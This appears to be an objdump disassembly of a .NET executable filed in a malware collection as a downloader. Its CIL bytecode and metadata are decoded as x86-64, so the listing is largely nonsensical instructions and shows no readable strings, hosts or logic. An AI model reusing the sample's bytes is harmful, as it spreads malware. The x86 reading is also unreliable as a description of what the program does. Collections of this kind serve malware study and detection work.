
malware_samples/downloader/11881702372ebdeb3b2386a3dd1a6e8f40374867317ffcd23b74c892502cc6af.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140002000 <.text>:
   140002000:	48 00 00             	rex.W add %al,(%rax)
   140002003:	00 02                	add    %al,(%rdx)
   140002005:	00 05 00 20 24 00    	add    %al,0x242000(%rip)        # 0x14024400b
   14000200b:	00 3c 14             	add    %bh,(%rsp,%rdx,1)
   14000200e:	00 00                	add    %al,(%rax)
   140002010:	01 00                	add    %eax,(%rax)
   140002012:	00 00                	add    %al,(%rax)
   140002014:	01 00                	add    %eax,(%rax)
   140002016:	00 06                	add    %al,(%rsi)
   140002018:	5c                   	pop    %rsp
   140002019:	38 00                	cmp    %al,(%rax)
   14000201b:	00 b8 00 00 00 00    	add    %bh,0x0(%rax)
	...
   140002045:	00 00                	add    %al,(%rax)
   140002047:	00 22                	add    %ah,(%rdx)
   140002049:	00 73 0c             	add    %dh,0xc(%rbx)
   14000204c:	00 00                	add    %al,(%rax)
   14000204e:	06                   	(bad)
   14000204f:	26 2a 22             	es sub (%rdx),%ah
   140002052:	02 28                	add    (%rax),%ch
   140002054:	14 00                	adc    $0x0,%al
   140002056:	00 0a                	add    %cl,(%rdx)
   140002058:	00 2a                	add    %ch,(%rdx)
   14000205a:	00 00                	add    %al,(%rax)
   14000205c:	13 30                	adc    (%rax),%esi
   14000205e:	02 00                	add    (%rax),%al
   140002060:	2b 00                	sub    (%rax),%eax
   140002062:	00 00                	add    %al,(%rax)
   140002064:	01 00                	add    %eax,(%rax)
   140002066:	00 11                	add    %dl,(%rcx)
   140002068:	00 03                	add    %al,(%rbx)
   14000206a:	2c 0b                	sub    $0xb,%al
   14000206c:	02 7b 01             	add    0x1(%rbx),%bh
   14000206f:	00 00                	add    %al,(%rax)
   140002071:	04 14                	add    $0x14,%al
   140002073:	fe 03                	incb   (%rbx)
   140002075:	2b 01                	sub    (%rcx),%eax
   140002077:	16                   	(bad)
   140002078:	0a 06                	or     (%rsi),%al
   14000207a:	2c 0e                	sub    $0xe,%al
   14000207c:	00 02                	add    %al,(%rdx)
   14000207e:	7b 01                	jnp    0x140002081
   140002080:	00 00                	add    %al,(%rax)
   140002082:	04 6f                	add    $0x6f,%al
   140002084:	15 00 00 0a 00       	adc    $0xa0000,%eax
   140002089:	00 02                	add    %al,(%rdx)
   14000208b:	03 28                	add    (%rax),%ebp
   14000208d:	16                   	(bad)
   14000208e:	00 00                	add    %al,(%rax)
   140002090:	0a 00                	or     (%rax),%al
   140002092:	2a de                	sub    %dh,%bl
   140002094:	00 02                	add    %al,(%rdx)
   140002096:	73 17                	jae    0x1400020af
   140002098:	00 00                	add    %al,(%rax)
   14000209a:	0a 7d 01             	or     0x1(%rbp),%bh
   14000209d:	00 00                	add    %al,(%rax)
   14000209f:	04 02                	add    $0x2,%al
   1400020a1:	17                   	(bad)
   1400020a2:	28 18                	sub    %bl,(%rax)
   1400020a4:	00 00                	add    %al,(%rax)
   1400020a6:	0a 00                	or     (%rax),%al
   1400020a8:	02 20                	add    (%rax),%ah
   1400020aa:	20 03                	and    %al,(%rbx)
   1400020ac:	00 00                	add    %al,(%rax)
   1400020ae:	20 c2                	and    %al,%dl
   1400020b0:	01 00                	add    %eax,(%rax)
   1400020b2:	00 73 19             	add    %dh,0x19(%rbx)
   1400020b5:	00 00                	add    %al,(%rax)
   1400020b7:	0a 28                	or     (%rax),%ch
   1400020b9:	1a 00                	sbb    (%rax),%al
   1400020bb:	00 0a                	add    %cl,(%rdx)
   1400020bd:	00 02                	add    %al,(%rdx)
   1400020bf:	72 01                	jb     0x1400020c2
   1400020c1:	00 00                	add    %al,(%rax)
   1400020c3:	70 6f                	jo     0x140002134
   1400020c5:	1b 00                	sbb    (%rax),%eax
   1400020c7:	00 0a                	add    %cl,(%rdx)
   1400020c9:	00 2a                	add    %ch,(%rdx)
   1400020cb:	5e                   	pop    %rsi
   1400020cc:	02 14 7d 01 00 00 04 	add    0x4000001(,%rdi,2),%dl
   1400020d3:	02 28                	add    (%rax),%ch
   1400020d5:	1c 00                	sbb    $0x0,%al
   1400020d7:	00 0a                	add    %cl,(%rdx)
   1400020d9:	00 00                	add    %al,(%rax)
   1400020db:	02 28                	add    (%rax),%ch
   1400020dd:	04 00                	add    $0x0,%al
   1400020df:	00 06                	add    %al,(%rsi)
   1400020e1:	00 2a                	add    %ch,(%rdx)
   1400020e3:	00 13                	add    %dl,(%rbx)
   1400020e5:	30 03                	xor    %al,(%rbx)
   1400020e7:	00 61 00             	add    %ah,0x0(%rcx)
   1400020ea:	00 00                	add    %al,(%rax)
   1400020ec:	02 00                	add    (%rax),%al
   1400020ee:	00 11                	add    %dl,(%rcx)
   1400020f0:	00 03                	add    %al,(%rbx)
   1400020f2:	0a 73 1d             	or     0x1d(%rbx),%dh
   1400020f5:	00 00                	add    %al,(%rax)
   1400020f7:	0a 0b                	or     (%rbx),%cl
   1400020f9:	07                   	(bad)
   1400020fa:	6f                   	outsl  (%rsi),(%dx)
   1400020fb:	1e                   	(bad)
   1400020fc:	00 00                	add    %al,(%rax)
   1400020fe:	0a 72 0d             	or     0xd(%rdx),%dh
   140002101:	00 00                	add    %al,(%rax)
   140002103:	70 6f                	jo     0x140002174
   140002105:	1f                   	(bad)
   140002106:	00 00                	add    %al,(%rax)
   140002108:	0a 00                	or     (%rax),%al
   14000210a:	07                   	(bad)
   14000210b:	6f                   	outsl  (%rsi),(%dx)
   14000210c:	1e                   	(bad)
   14000210d:	00 00                	add    %al,(%rax)
   14000210f:	0a 72 15             	or     0x15(%rdx),%dh
   140002112:	00 00                	add    %al,(%rax)
   140002114:	70 6f                	jo     0x140002185
   140002116:	20 00                	and    %al,(%rax)
   140002118:	00 0a                	add    %cl,(%rdx)
   14000211a:	00 07                	add    %al,(%rdi)
   14000211c:	6f                   	outsl  (%rsi),(%dx)
   14000211d:	1e                   	(bad)
   14000211e:	00 00                	add    %al,(%rax)
   140002120:	0a 17                	or     (%rdi),%dl
   140002122:	6f                   	outsl  (%rsi),(%dx)
   140002123:	21 00                	and    %eax,(%rax)
   140002125:	00 0a                	add    %cl,(%rdx)
   140002127:	00 07                	add    %al,(%rdi)
   140002129:	6f                   	outsl  (%rsi),(%dx)
   14000212a:	22 00                	and    (%rax),%al
   14000212c:	00 0a                	add    %cl,(%rdx)
   14000212e:	26 2b 02             	es sub (%rdx),%eax
   140002131:	00 00                	add    %al,(%rax)
   140002133:	07                   	(bad)
   140002134:	6f                   	outsl  (%rsi),(%dx)
   140002135:	23 00                	and    (%rax),%eax
   140002137:	00 0a                	add    %cl,(%rdx)
   140002139:	16                   	(bad)
   14000213a:	fe 01                	incb   (%rcx)
   14000213c:	0c 08                	or     $0x8,%al
   14000213e:	2d f1 06 16 06       	sub    $0x61606f1,%eax
   140002143:	8e 69 28             	mov    0x28(%rcx),%gs
   140002146:	24 00                	and    $0x0,%al
   140002148:	00 0a                	add    %cl,(%rdx)
   14000214a:	00 06                	add    %al,(%rsi)
   14000214c:	0d 2b 00 09 2a       	or     $0x2a09002b,%eax
   140002151:	00 00                	add    %al,(%rax)
   140002153:	00 13                	add    %dl,(%rbx)
   140002155:	30 02                	xor    %al,(%rdx)
   140002157:	00 29                	add    %ch,(%rcx)
   140002159:	00 00                	add    %al,(%rax)
   14000215b:	00 03                	add    %al,(%rbx)
   14000215d:	00 00                	add    %al,(%rax)
   14000215f:	11 00                	adc    %eax,(%rax)
   140002161:	73 25                	jae    0x140002188
   140002163:	00 00                	add    %al,(%rax)
   140002165:	0a 0a                	or     (%rdx),%cl
   140002167:	02 03                	add    (%rbx),%al
   140002169:	28 08                	sub    %cl,(%rax)
   14000216b:	00 00                	add    %al,(%rax)
   14000216d:	06                   	(bad)
   14000216e:	06                   	(bad)
   14000216f:	6f                   	outsl  (%rsi),(%dx)
   140002170:	26 00 00             	es add %al,(%rax)
   140002173:	0a 00                	or     (%rax),%al
   140002175:	06                   	(bad)
   140002176:	6f                   	outsl  (%rsi),(%dx)
   140002177:	27                   	(bad)
   140002178:	00 00                	add    %al,(%rax)
   14000217a:	0a 0b                	or     (%rbx),%cl
   14000217c:	06                   	(bad)
   14000217d:	6f                   	outsl  (%rsi),(%dx)
   14000217e:	28 00                	sub    %al,(%rax)
   140002180:	00 0a                	add    %cl,(%rdx)
   140002182:	00 07                	add    %al,(%rdi)
   140002184:	0c 2b                	or     $0x2b,%al
   140002186:	00 08                	add    %cl,(%rax)
   140002188:	2a 00                	sub    (%rax),%al
   14000218a:	00 00                	add    %al,(%rax)
   14000218c:	1b 30                	sbb    (%rax),%esi
   14000218e:	01 00                	add    %eax,(%rax)
   140002190:	3a 00                	cmp    (%rax),%al
   140002192:	00 00                	add    %al,(%rax)
   140002194:	04 00                	add    $0x0,%al
   140002196:	00 11                	add    %dl,(%rcx)
   140002198:	00 00                	add    %al,(%rax)
   14000219a:	20 00                	and    %al,(%rax)
   14000219c:	0c 00                	or     $0x0,%al
   14000219e:	00 28                	add    %ch,(%rax)
   1400021a0:	29 00                	sub    %eax,(%rax)
   1400021a2:	00 0a                	add    %cl,(%rdx)
   1400021a4:	00 00                	add    %al,(%rax)
   1400021a6:	de 05 26 00 00 de    	fiadds -0x21ffffda(%rip)        # 0x11e0021d2
   1400021ac:	00 03                	add    %al,(%rbx)
   1400021ae:	28 2a                	sub    %ch,(%rdx)
   1400021b0:	00 00                	add    %al,(%rax)
   1400021b2:	0a 74 17 00          	or     0x0(%rdi,%rdx,1),%dh
   1400021b6:	00 01                	add    %al,(%rcx)
   1400021b8:	0a 06                	or     (%rsi),%al
   1400021ba:	6f                   	outsl  (%rsi),(%dx)
   1400021bb:	2b 00                	sub    (%rax),%eax
   1400021bd:	00 0a                	add    %cl,(%rdx)
   1400021bf:	74 18                	je     0x1400021d9
   1400021c1:	00 00                	add    %al,(%rax)
   1400021c3:	01 0b                	add    %ecx,(%rbx)
   1400021c5:	07                   	(bad)
   1400021c6:	6f                   	outsl  (%rsi),(%dx)
   1400021c7:	2c 00                	sub    $0x0,%al
   1400021c9:	00 0a                	add    %cl,(%rdx)
   1400021cb:	0c 08                	or     $0x8,%al
   1400021cd:	0d 2b 00 09 2a       	or     $0x2a09002b,%eax
   1400021d2:	00 00                	add    %al,(%rax)
   1400021d4:	01 10                	add    %edx,(%rax)
   1400021d6:	00 00                	add    %al,(%rax)
   1400021d8:	00 00                	add    %al,(%rax)
   1400021da:	01 00                	add    %eax,(%rax)
   1400021dc:	0f 10 00             	movups (%rax),%xmm0
   1400021df:	05 10 00 00 01       	add    $0x1000010,%eax
   1400021e4:	13 30                	adc    (%rax),%esi
   1400021e6:	03 00                	add    (%rax),%eax
   1400021e8:	1c 00                	sbb    $0x0,%al
   1400021ea:	00 00                	add    %al,(%rax)
   1400021ec:	05 00 00 11 00       	add    $0x110000,%eax
   1400021f1:	02 02                	add    (%rdx),%al
   1400021f3:	72 49                	jb     0x14000223e
   1400021f5:	00 00                	add    %al,(%rax)
   1400021f7:	70 28                	jo     0x140002221
   1400021f9:	07                   	(bad)
   1400021fa:	00 00                	add    %al,(%rax)
   1400021fc:	06                   	(bad)
   1400021fd:	28 06                	sub    %al,(%rsi)
   1400021ff:	00 00                	add    %al,(%rax)
   140002201:	06                   	(bad)
   140002202:	28 2d 00 00 0a 0a    	sub    %ch,0xa0a0000(%rip)        # 0x14a0a2208
   140002208:	2b 00                	sub    (%rax),%eax
   14000220a:	06                   	(bad)
   14000220b:	2a 13                	sub    (%rbx),%dl
   14000220d:	30 02                	xor    %al,(%rdx)
   14000220f:	00 2b                	add    %ch,(%rbx)
   140002211:	00 00                	add    %al,(%rax)
   140002213:	00 01                	add    %al,(%rcx)
   140002215:	00 00                	add    %al,(%rax)
   140002217:	11 00                	adc    %eax,(%rax)
   140002219:	03 2c 0b             	add    (%rbx,%rcx,1),%ebp
   14000221c:	02 7b 02             	add    0x2(%rbx),%bh
   14000221f:	00 00                	add    %al,(%rax)
   140002221:	04 14                	add    $0x14,%al
   140002223:	fe 03                	incb   (%rbx)
   140002225:	2b 01                	sub    (%rcx),%eax
   140002227:	16                   	(bad)
   140002228:	0a 06                	or     (%rsi),%al
   14000222a:	2c 0e                	sub    $0xe,%al
   14000222c:	00 02                	add    %al,(%rdx)
   14000222e:	7b 02                	jnp    0x140002232
   140002230:	00 00                	add    %al,(%rax)
   140002232:	04 6f                	add    $0x6f,%al
   140002234:	15 00 00 0a 00       	adc    $0xa0000,%eax
   140002239:	00 02                	add    %al,(%rdx)
   14000223b:	03 28                	add    (%rax),%ebp
   14000223d:	16                   	(bad)
   14000223e:	00 00                	add    %al,(%rax)
   140002240:	0a 00                	or     (%rax),%al
   140002242:	2a 00                	sub    (%rax),%al
   140002244:	13 30                	adc    (%rax),%esi
   140002246:	03 00                	add    (%rax),%eax
   140002248:	43 00 00             	rex.XB add %al,(%r8)
   14000224b:	00 00                	add    %al,(%rax)
   14000224d:	00 00                	add    %al,(%rax)
   14000224f:	00 00                	add    %al,(%rax)
   140002251:	02 73 17             	add    0x17(%rbx),%dh
   140002254:	00 00                	add    %al,(%rax)
   140002256:	0a 7d 02             	or     0x2(%rbp),%bh
   140002259:	00 00                	add    %al,(%rax)
   14000225b:	04 02                	add    $0x2,%al
   14000225d:	17                   	(bad)
   14000225e:	28 18                	sub    %bl,(%rax)
   140002260:	00 00                	add    %al,(%rax)
   140002262:	0a 00                	or     (%rax),%al
   140002264:	02 20                	add    (%rax),%ah
   140002266:	20 03                	and    %al,(%rbx)
   140002268:	00 00                	add    %al,(%rax)
   14000226a:	20 c2                	and    %al,%dl
   14000226c:	01 00                	add    %eax,(%rax)
   14000226e:	00 73 19             	add    %dh,0x19(%rbx)
   140002271:	00 00                	add    %al,(%rax)
   140002273:	0a 28                	or     (%rax),%ch
   140002275:	1a 00                	sbb    (%rax),%al
   140002277:	00 0a                	add    %cl,(%rdx)
   140002279:	00 02                	add    %al,(%rdx)
   14000227b:	72 4c                	jb     0x1400022c9
   14000227d:	01 00                	add    %eax,(%rax)
   14000227f:	70 6f                	jo     0x1400022f0
   140002281:	1b 00                	sbb    (%rax),%eax
   140002283:	00 0a                	add    %cl,(%rdx)
   140002285:	00 02                	add    %al,(%rdx)
   140002287:	72 7c                	jb     0x140002305
   140002289:	01 00                	add    %eax,(%rax)
   14000228b:	70 28                	jo     0x1400022b5
   14000228d:	2e 00 00             	cs add %al,(%rax)
   140002290:	0a 00                	or     (%rax),%al
   140002292:	2a 7a 02             	sub    0x2(%rdx),%bh
   140002295:	14 7d                	adc    $0x7d,%al
   140002297:	02 00                	add    (%rax),%al
   140002299:	00 04 02             	add    %al,(%rdx,%rax,1)
   14000229c:	28 1c 00             	sub    %bl,(%rax,%rax,1)
   14000229f:	00 0a                	add    %cl,(%rdx)
   1400022a1:	00 00                	add    %al,(%rax)
   1400022a3:	02 28                	add    (%rax),%ch
   1400022a5:	0b 00                	or     (%rax),%eax
   1400022a7:	00 06                	add    %al,(%rsi)
   1400022a9:	00 02                	add    %al,(%rdx)
   1400022ab:	28 0d 00 00 06 00    	sub    %cl,0x60000(%rip)        # 0x1400622b1
   1400022b1:	2a 00                	sub    (%rax),%al
   1400022b3:	00 13                	add    %dl,(%rbx)
   1400022b5:	30 06                	xor    %al,(%rsi)
   1400022b7:	00 90 00 00 00 06    	add    %dl,0x6000000(%rax)
   1400022bd:	00 00                	add    %al,(%rax)
   1400022bf:	11 00                	adc    %eax,(%rax)
   1400022c1:	73 05                	jae    0x1400022c8
   1400022c3:	00 00                	add    %al,(%rax)
   1400022c5:	06                   	(bad)
   1400022c6:	28 09                	sub    %cl,(%rcx)
   1400022c8:	00 00                	add    %al,(%rax)
   1400022ca:	06                   	(bad)
   1400022cb:	0a 06                	or     (%rsi),%al
   1400022cd:	14 28                	adc    $0x28,%al
   1400022cf:	2f                   	(bad)
   1400022d0:	00 00                	add    %al,(%rax)
   1400022d2:	0a 0b                	or     (%rbx),%cl
   1400022d4:	07                   	(bad)
   1400022d5:	2c 06                	sub    $0x6,%al
   1400022d7:	73 30                	jae    0x140002309
   1400022d9:	00 00                	add    %al,(%rax)
   1400022db:	0a 7a 00             	or     0x0(%rdx),%bh
   1400022de:	06                   	(bad)
   1400022df:	6f                   	outsl  (%rsi),(%dx)
   1400022e0:	31 00                	xor    %eax,(%rax)
   1400022e2:	00 0a                	add    %cl,(%rdx)
   1400022e4:	02 fe                	add    %dh,%bh
   1400022e6:	06                   	(bad)
   1400022e7:	0e                   	(bad)
   1400022e8:	00 00                	add    %al,(%rax)
   1400022ea:	06                   	(bad)
   1400022eb:	73 32                	jae    0x14000231f
   1400022ed:	00 00                	add    %al,(%rax)
   1400022ef:	0a 28                	or     (%rax),%ch
   1400022f1:	01 00                	add    %eax,(%rax)
   1400022f3:	00 2b                	add    %ch,(%rbx)
   1400022f5:	0c 08                	or     $0x8,%al
   1400022f7:	14 28                	adc    $0x28,%al
   1400022f9:	34 00                	xor    $0x0,%al
   1400022fb:	00 0a                	add    %cl,(%rdx)
   1400022fd:	0d 09 2c 06 73       	or     $0x73062c09,%eax
   140002302:	30 00                	xor    %al,(%rax)
   140002304:	00 0a                	add    %cl,(%rdx)
   140002306:	7a 00                	jp     0x140002308
   140002308:	08 6f 35             	or     %ch,0x35(%rdi)
   14000230b:	00 00                	add    %al,(%rax)
   14000230d:	0a 02                	or     (%rdx),%al
   14000230f:	fe 06                	incb   (%rsi)
   140002311:	0f 00 00             	sldt   (%rax)
   140002314:	06                   	(bad)
   140002315:	73 36                	jae    0x14000234d
   140002317:	00 00                	add    %al,(%rax)
   140002319:	0a 28                	or     (%rax),%ch
   14000231b:	02 00                	add    (%rax),%al
   14000231d:	00 2b                	add    %ch,(%rbx)
   14000231f:	13 04 11             	adc    (%rcx,%rdx,1),%eax
   140002322:	04 14                	add    $0x14,%al
   140002324:	28 37                	sub    %dh,(%rdi)
   140002326:	00 00                	add    %al,(%rax)
   140002328:	0a 13                	or     (%rbx),%dl
   14000232a:	05 11 05 2c 06       	add    $0x62c0511,%eax
   14000232f:	73 30                	jae    0x140002361
   140002331:	00 00                	add    %al,(%rax)
   140002333:	0a 7a 00             	or     0x0(%rdx),%bh
   140002336:	08 11                	or     %dl,(%rcx)
   140002338:	04 6f                	add    $0x6f,%al
   14000233a:	38 00                	cmp    %al,(%rax)
   14000233c:	00 0a                	add    %cl,(%rdx)
   14000233e:	20 00                	and    %al,(%rax)
   140002340:	01 00                	add    %eax,(%rax)
   140002342:	00 14 14             	add    %dl,(%rsp,%rdx,1)
   140002345:	14 6f                	adc    $0x6f,%al
   140002347:	39 00                	cmp    %eax,(%rax)
   140002349:	00 0a                	add    %cl,(%rdx)
   14000234b:	26 00 00             	es add %al,(%rax)
   14000234e:	00 2a                	add    %ch,(%rdx)
   140002350:	4a 03 6f 3a          	rex.WX add 0x3a(%rdi),%rbp
   140002354:	00 00                	add    %al,(%rax)
   140002356:	0a 02                	or     (%rdx),%al
   140002358:	6f                   	outsl  (%rsi),(%dx)
   140002359:	3b 00                	cmp    (%rax),%eax
   14000235b:	00 0a                	add    %cl,(%rdx)
   14000235d:	28 3c 00             	sub    %bh,(%rax,%rax,1)
   140002360:	00 0a                	add    %cl,(%rdx)
   140002362:	2a 4a 03             	sub    0x3(%rdx),%cl
   140002365:	6f                   	outsl  (%rsi),(%dx)
   140002366:	38 00                	cmp    %al,(%rax)
   140002368:	00 0a                	add    %cl,(%rdx)
   14000236a:	02 28                	add    (%rax),%ch
   14000236c:	3d 00 00 0a 28       	cmp    $0x280a0000,%eax
   140002371:	3c 00                	cmp    $0x0,%al
   140002373:	00 0a                	add    %cl,(%rdx)
   140002375:	2a 26                	sub    (%rsi),%ah
   140002377:	02 28                	add    (%rax),%ch
   140002379:	14 00                	adc    $0x0,%al
   14000237b:	00 0a                	add    %cl,(%rdx)
   14000237d:	00 00                	add    %al,(%rax)
   14000237f:	2a 13                	sub    (%rbx),%dl
   140002381:	30 02                	xor    %al,(%rdx)
   140002383:	00 39                	add    %bh,(%rcx)
   140002385:	00 00                	add    %al,(%rax)
   140002387:	00 07                	add    %al,(%rdi)
   140002389:	00 00                	add    %al,(%rax)
   14000238b:	11 00                	adc    %eax,(%rax)
   14000238d:	7e 03                	jle    0x140002392
   14000238f:	00 00                	add    %al,(%rax)
   140002391:	04 14                	add    $0x14,%al
   140002393:	fe 01                	incb   (%rcx)
   140002395:	0a 06                	or     (%rsi),%al
   140002397:	2c 22                	sub    $0x22,%al
   140002399:	00 72 a2             	add    %dh,-0x5e(%rdx)
   14000239c:	01 00                	add    %eax,(%rax)
   14000239e:	70 d0                	jo     0x140002370
   1400023a0:	05 00 00 02 28       	add    $0x28020000,%eax
   1400023a5:	3e 00 00             	ds add %al,(%rax)
   1400023a8:	0a 6f 3f             	or     0x3f(%rdi),%ch
   1400023ab:	00 00                	add    %al,(%rax)
   1400023ad:	0a 73 40             	or     0x40(%rbx),%dh
   1400023b0:	00 00                	add    %al,(%rax)
   1400023b2:	0a 0b                	or     (%rbx),%cl
   1400023b4:	07                   	(bad)
   1400023b5:	80 03 00             	addb   $0x0,(%rbx)
   1400023b8:	00 04 00             	add    %al,(%rax,%rax,1)
   1400023bb:	7e 03                	jle    0x1400023c0
   1400023bd:	00 00                	add    %al,(%rax)
   1400023bf:	04 0c                	add    $0xc,%al
   1400023c1:	2b 00                	sub    (%rax),%eax
   1400023c3:	08 2a                	or     %ch,(%rdx)
   1400023c5:	00 00                	add    %al,(%rax)
   1400023c7:	00 13                	add    %dl,(%rbx)
   1400023c9:	30 01                	xor    %al,(%rcx)
   1400023cb:	00 0b                	add    %cl,(%rbx)
   1400023cd:	00 00                	add    %al,(%rax)
   1400023cf:	00 08                	add    %cl,(%rax)
   1400023d1:	00 00                	add    %al,(%rax)
   1400023d3:	11 00                	adc    %eax,(%rax)
   1400023d5:	7e 04                	jle    0x1400023db
   1400023d7:	00 00                	add    %al,(%rax)
   1400023d9:	04 0a                	add    $0xa,%al
   1400023db:	2b 00                	sub    (%rax),%eax
   1400023dd:	06                   	(bad)
   1400023de:	2a 22                	sub    (%rdx),%ah
   1400023e0:	00 02                	add    %al,(%rdx)
   1400023e2:	80 04 00 00          	addb   $0x0,(%rax,%rax,1)
   1400023e6:	04 2a                	add    $0x2a,%al
   1400023e8:	13 30                	adc    (%rax),%esi
   1400023ea:	01 00                	add    %eax,(%rax)
   1400023ec:	0b 00                	or     (%rax),%eax
   1400023ee:	00 00                	add    %al,(%rax)
   1400023f0:	09 00                	or     %eax,(%rax)
   1400023f2:	00 11                	add    %dl,(%rcx)
   1400023f4:	00 7e 05             	add    %bh,0x5(%rsi)
   1400023f7:	00 00                	add    %al,(%rax)
   1400023f9:	04 0a                	add    $0xa,%al
   1400023fb:	2b 00                	sub    (%rax),%eax
   1400023fd:	06                   	(bad)
   1400023fe:	2a 22                	sub    (%rdx),%ah
   140002400:	02 28                	add    (%rax),%ch
   140002402:	41 00 00             	add    %al,(%r8)
   140002405:	0a 00                	or     (%rax),%al
   140002407:	2a 56 73             	sub    0x73(%rsi),%dl
   14000240a:	15 00 00 06 28       	adc    $0x28060000,%eax
   14000240f:	42 00 00             	rex.X add %al,(%rax)
   140002412:	0a 74 06 00          	or     0x0(%rsi,%rax,1),%dh
   140002416:	00 02                	add    %al,(%rdx)
   140002418:	80 05 00 00 04 2a 00 	addb   $0x0,0x2a040000(%rip)        # 0x16a04241f
   14000241f:	00 42 53             	add    %al,0x53(%rdx)
   140002422:	4a                   	rex.WX
   140002423:	42 01 00             	rex.X add %eax,(%rax)
   140002426:	01 00                	add    %eax,(%rax)
   140002428:	00 00                	add    %al,(%rax)
   14000242a:	00 00                	add    %al,(%rax)
   14000242c:	0c 00                	or     $0x0,%al
   14000242e:	00 00                	add    %al,(%rax)
   140002430:	76 34                	jbe    0x140002466
   140002432:	2e 30 2e             	cs xor %ch,(%rsi)
   140002435:	33 30                	xor    (%rax),%esi
   140002437:	33 31                	xor    (%rcx),%esi
   140002439:	39 00                	cmp    %eax,(%rax)
   14000243b:	00 00                	add    %al,(%rax)
   14000243d:	00 05 00 6c 00 00    	add    %al,0x6c00(%rip)        # 0x140009043
   140002443:	00 94 06 00 00 23 7e 	add    %dl,0x7e230000(%rsi,%rax,1)
   14000244a:	00 00                	add    %al,(%rax)
   14000244c:	00 07                	add    %al,(%rdi)
   14000244e:	00 00                	add    %al,(%rax)
   140002450:	d0 07                	rolb   $1,(%rdi)
   140002452:	00 00                	add    %al,(%rax)
   140002454:	23 53 74             	and    0x74(%rbx),%edx
   140002457:	72 69                	jb     0x1400024c2
   140002459:	6e                   	outsb  (%rsi),(%dx)
   14000245a:	67 73 00             	addr32 jae 0x14000245d
   14000245d:	00 00                	add    %al,(%rax)
   14000245f:	00 d0                	add    %dl,%al
   140002461:	0e                   	(bad)
   140002462:	00 00                	add    %al,(%rax)
   140002464:	dc 01                	faddl  (%rcx)
   140002466:	00 00                	add    %al,(%rax)
   140002468:	23 55 53             	and    0x53(%rbp),%edx
   14000246b:	00 ac 10 00 00 10 00 	add    %ch,0x100000(%rax,%rdx,1)
   140002472:	00 00                	add    %al,(%rax)
   140002474:	23 47 55             	and    0x55(%rdi),%eax
   140002477:	49                   	rex.WB
   140002478:	44 00 00             	add    %r8b,(%rax)
   14000247b:	00 bc 10 00 00 80 03 	add    %bh,0x3800000(%rax,%rdx,1)
   140002482:	00 00                	add    %al,(%rax)
   140002484:	23 42 6c             	and    0x6c(%rdx),%eax
   140002487:	6f                   	outsl  (%rsi),(%dx)
   140002488:	62                   	(bad)
   140002489:	00 00                	add    %al,(%rax)
   14000248b:	00 00                	add    %al,(%rax)
   14000248d:	00 00                	add    %al,(%rax)
   14000248f:	00 02                	add    %al,(%rdx)
   140002491:	00 00                	add    %al,(%rax)
   140002493:	01 57 15             	add    %edx,0x15(%rdi)
   140002496:	a2 09 09 09 00 00 00 	movabs %al,0x1fa000000090909
   14000249d:	fa 01 
   14000249f:	33 00                	xor    (%rax),%eax
   1400024a1:	16                   	(bad)
   1400024a2:	00 00                	add    %al,(%rax)
   1400024a4:	01 00                	add    %eax,(%rax)
   1400024a6:	00 00                	add    %al,(%rax)
   1400024a8:	3a 00                	cmp    (%rax),%al
   1400024aa:	00 00                	add    %al,(%rax)
   1400024ac:	06                   	(bad)
   1400024ad:	00 00                	add    %al,(%rax)
   1400024af:	00 05 00 00 00 16    	add    %al,0x16000000(%rip)        # 0x1560024b5
   1400024b5:	00 00                	add    %al,(%rax)
   1400024b7:	00 09                	add    %cl,(%rcx)
   1400024b9:	00 00                	add    %al,(%rax)
   1400024bb:	00 42 00             	add    %al,0x0(%rdx)
   1400024be:	00 00                	add    %al,(%rax)
   1400024c0:	18 00                	sbb    %al,(%rax)
   1400024c2:	00 00                	add    %al,(%rax)
   1400024c4:	09 00                	or     %eax,(%rax)
   1400024c6:	00 00                	add    %al,(%rax)
   1400024c8:	02 00                	add    (%rax),%al
   1400024ca:	00 00                	add    %al,(%rax)
   1400024cc:	03 00                	add    (%rax),%eax
   1400024ce:	00 00                	add    %al,(%rax)
   1400024d0:	04 00                	add    $0x0,%al
   1400024d2:	00 00                	add    %al,(%rax)
   1400024d4:	02 00                	add    (%rax),%al
   1400024d6:	00 00                	add    %al,(%rax)
   1400024d8:	01 00                	add    %eax,(%rax)
   1400024da:	00 00                	add    %al,(%rax)
   1400024dc:	05 00 00 00 01       	add    $0x1000000,%eax
   1400024e1:	00 00                	add    %al,(%rax)
   1400024e3:	00 02                	add    %al,(%rdx)
   1400024e5:	00 00                	add    %al,(%rax)
   1400024e7:	00 00                	add    %al,(%rax)
   1400024e9:	00 02                	add    %al,(%rdx)
   1400024eb:	04 01                	add    $0x1,%al
   1400024ed:	00 00                	add    %al,(%rax)
   1400024ef:	00 00                	add    %al,(%rax)
   1400024f1:	00 06                	add    %al,(%rsi)
   1400024f3:	00 71 03             	add    %dh,0x3(%rcx)
   1400024f6:	69 06 06 00 de 03    	imul   $0x3de0006,(%rsi),%eax
   1400024fc:	69 06 06 00 8c 02    	imul   $0x28c0006,(%rsi),%eax
   140002502:	2c 06                	sub    $0x6,%al
   140002504:	0f 00 c1             	sldt   %ecx
   140002507:	06                   	(bad)
   140002508:	00 00                	add    %al,(%rax)
   14000250a:	06                   	(bad)
   14000250b:	00 cd                	add    %cl,%ch
   14000250d:	02 42 05             	add    0x5(%rdx),%al
   140002510:	06                   	(bad)
   140002511:	00 54 03 42          	add    %dl,0x42(%rbx,%rax,1)
   140002515:	05 06 00 35 03       	add    $0x3350006,%eax
   14000251a:	42 05 06 00 c5 03    	rex.X add $0x3c50006,%eax
   140002520:	42 05 06 00 91 03    	rex.X add $0x3910006,%eax
   140002526:	42 05 06 00 aa 03    	rex.X add $0x3aa0006,%eax
   14000252c:	42 05 06 00 e4 02    	rex.X add $0x2e40006,%eax
   140002532:	42 05 06 00 b9 02    	rex.X add $0x2b90006,%eax
   140002538:	4a 06                	rex.WX (bad)
   14000253a:	06                   	(bad)
   14000253b:	00 4a 02             	add    %cl,0x2(%rdx)
   14000253e:	4a 06                	rex.WX (bad)
   140002540:	06                   	(bad)
   140002541:	00 18                	add    %bl,(%rax)
   140002543:	03 42 05             	add    0x5(%rdx),%eax
   140002546:	06                   	(bad)
   140002547:	00 ff                	add    %bh,%bh
   140002549:	02 3c 04             	add    (%rsp,%rax,1),%bh
   14000254c:	06                   	(bad)
   14000254d:	00 43 07             	add    %al,0x7(%rbx)
   140002550:	f3 04 06             	repz add $0x6,%al
   140002553:	00 1c 02             	add    %bl,(%rdx,%rax,1)
   140002556:	f3 04 0a             	repz add $0xa,%al
   140002559:	00 fa                	add    %bh,%dl
   14000255b:	04 0d                	add    $0xd,%al
